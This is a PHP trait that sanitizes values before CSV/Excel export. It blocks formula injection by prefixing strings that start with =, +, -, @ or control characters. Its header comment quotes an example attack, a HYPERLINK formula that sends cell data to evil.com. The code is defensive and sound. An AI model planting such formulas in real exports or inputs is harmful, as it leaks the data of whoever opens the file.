<?php

namespace App\Traits;

/**
 * Trait SanitizesExportData
 *
 * SECURITY: Prevents CSV/Excel formula injection attacks.
 * When user-controlled data is exported to CSV/Excel, malicious values
 * starting with =, +, -, @, or tab characters can be interpreted as formulas.
 *
 * Example attack: A user enters "=HYPERLINK("http://evil.com?d="&A1,"Click me")" as their name
 * This could be used for data exfiltration when the file is opened in Excel.
 */
trait SanitizesExportData
{
    /**
     * Sanitize a value for safe export to CSV/Excel.
     * Prefixes dangerous characters with a single quote to prevent formula interpretation.
     *
     * @param mixed $value The value to sanitize
     * @return mixed The sanitized value
     */
    protected function sanitizeExportValue(mixed $value): mixed
    {
        // Only process strings
        if (!is_string($value)) {
            return $value;
        }

        // Empty strings are safe
        if ($value === '') {
            return $value;
        }

        // Characters that can trigger formula interpretation in Excel
        // = : Standard formula prefix
        // + : Can be interpreted as formula (e.g., +A1)
        // - : Can be interpreted as formula (e.g., -A1)
        // @ : Excel's implicit intersection operator, can trigger formula
        // \t : Tab character can be used for injection
        // \r : Carriage return can be used for injection
        // \n : Newline can be used for injection
        $dangerousChars = ['=', '+', '-', '@', "\t", "\r", "\n"];

        // Check if the value starts with a dangerous character
        $firstChar = mb_substr($value, 0, 1);

        if (in_array($firstChar, $dangerousChars, true)) {
            // Prefix with single quote to prevent formula interpretation
            // Excel will display the value as-is (without the leading quote)
            return "'" . $value;
        }

        return $value;
    }

    /**
     * Sanitize an array of values for export.
     *
     * @param array $values The values to sanitize
     * @return array The sanitized values
     */
    protected function sanitizeExportRow(array $values): array
    {
        return array_map([$this, 'sanitizeExportValue'], $values);
    }
}
